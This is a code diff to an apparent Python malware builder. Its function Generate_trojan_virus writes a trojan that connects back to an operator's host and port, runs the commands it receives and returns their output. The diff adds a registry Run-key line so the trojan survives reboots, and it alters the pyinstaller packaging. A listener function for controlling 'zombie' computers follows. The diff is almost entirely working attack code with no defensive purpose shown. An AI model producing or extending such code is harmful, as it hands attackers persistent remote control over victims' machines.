@@ -172,6 +172,7 @@ def Generate_trojan_virus():
     lport = input("Enter connect port:")
     file = open("virus/" + name + ".py",'w')
     file.write('import socket, os, time\n')
+    file.write('os.system("REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v lol /t REG_SZ /d " + os.getcwd() + "\\\\' + name + '.exe /f")\n')
     file.write('s = socket.socket()\n')
     file.write('s.connect(("' + lhost + '",' + lport + '))\n')
     file.write('while True:\n')
@@ -181,7 +182,7 @@ def Generate_trojan_virus():
     file.write('        data = "command has no output or has a error."\n')
     file.write('    s.send(bytes(data,encoding="utf-8"))\n')
     file.close()
-    os.system("pyinstaller -w -F virus/" + name + ".py")
+    os.system("pyinstaller -F virus/" + name + ".py")
 
 def countrol_zombie_computer():
     listen_host = input("Enter the listen host ip like 127.0.0.1:")
